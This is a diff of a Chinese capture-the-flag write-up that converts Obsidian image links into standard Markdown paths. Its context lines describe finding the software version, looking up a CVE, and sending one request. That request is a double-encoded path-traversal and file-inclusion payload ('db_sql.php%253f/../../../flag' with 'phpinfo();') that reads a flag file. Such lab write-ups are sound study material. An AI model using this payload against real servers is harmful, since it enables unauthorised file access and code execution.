@@ -4,7 +4,7 @@
 /
 ```
 
-![[Pasted image 20230508011106.png|1500]]
+![](<./img/Pasted image 20230508011106.png>)
 
 题目描述
 ---
@@ -22,18 +22,18 @@ hint
 
 首先我们看一眼版本
 
-![[Pasted image 20230508011543.png|300]]
+![](<./img/Pasted image 20230508011543.png>)
 
 然后让我们去[CVE](https://cve.mitre.org/cve/search_cve_list.html)上搜一搜
 
-![[Pasted image 20230508012042.png|1500]]
+![](<./img/Pasted image 20230508012042.png>)
 
-![[Pasted image 20230508012629.png|800]]
+![](<./img/Pasted image 20230508012629.png>)
 
-![[Pasted image 20230508012642.png|800]]
+![](<./img/Pasted image 20230508012642.png>)
 
 ```
 /index.php?a=phpinfo();&target=db_sql.php%253f/../../../../../../flag
 ```
 
-![[Pasted image 20230508230625.png|800]]
+![](<./img/Pasted image 20230508230625.png>)
